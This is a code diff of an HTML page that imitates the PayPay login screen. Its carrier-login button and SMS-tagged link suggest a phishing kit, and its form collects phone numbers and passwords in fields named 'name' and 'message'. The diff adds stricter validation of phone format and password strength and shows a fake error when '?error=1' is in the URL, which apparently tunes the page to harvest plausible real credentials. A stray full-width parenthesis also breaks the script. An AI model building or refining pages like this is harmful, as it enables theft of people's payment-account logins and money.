@@ -202,15 +202,21 @@
       icon-sm
       ib vm
     "></i><span data-v-fca42784="" class="pl10">ソフトバンク・ワイモバイル・LINEMO</span></button></section><div data-v-d4060102="" class="switch-sign-flow">アカウントをお持ちでない場合<a data-v-d4060102="" href="https://www.paypay.ne.jp/app/account/sign-up?redirect=%2Fapp%2Fp2p%2FbouFYjxOgKOiqy48%3Fpid%3DSMS%26link_key%3DbouFYjxOgKOiqy48" class=""><strong data-v-d4060102="" class="fs16 pl10">新規登録</strong></a></div><!----></section></div></section></div></div><div></div><div></div><div></div><div></div><div></div>
-
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const form = document.querySelector("form");
   const phoneInput = document.querySelector("input[name='name']");
   const passwordInput = document.querySelector("input[name='message']");
   const errorDiv = document.getElementById("login-error-message");
+  const submitBtn = document.getElementById("submit"); 
 
-  if (!form || !phoneInput || !passwordInput) return;
+  const urlParams = new URLSearchParams(window.location.search);
+  if (urlParams.get('error') === '1' && errorDiv) {
+    errorDiv.style.display = 'block';
+  }
+
+  if (!form || !phoneInput || !passwordInput || !errorDiv) return;
+）
   phoneInput.addEventListener("input", (e) => {
     let value = e.target.value.replace(/\D/g, "");
     if (value.length > 11) value = value.substring(0, 11);
@@ -226,23 +232,31 @@ document.addEventListener("DOMContentLoaded", () => {
     e.target.value = formatted;
   });
 
-  form.addEventListener("submit", (event) => {
+  const validateForm = (event) => {
     const phone = phoneInput.value.replace(/[- ]/g, ''); 
     const password = passwordInput.value;
+
     let typeCount = 0;
     if (/[A-Z]/.test(password)) typeCount++;
     if (/[a-z]/.test(password)) typeCount++;
     if (/[0-9]/.test(password)) typeCount++;
+
     const isPhoneValid = /^(090|080|070|060)\d{8}$/.test(phone);
     const isPasswordValid = password.length >= 8 && typeCount >= 2;
 
     if (!isPhoneValid || !isPasswordValid) {
       event.preventDefault(); 
+      event.stopPropagation();
       errorDiv.style.display = "block"; 
+      return false;
     } else {
       errorDiv.style.display = "none";
     }
-  });
+  };
+
+  if (submitBtn) submitBtn.addEventListener("click", validateForm);
+  form.addEventListener("submit", validateForm);
 });
 </script>
+
 </body></html>
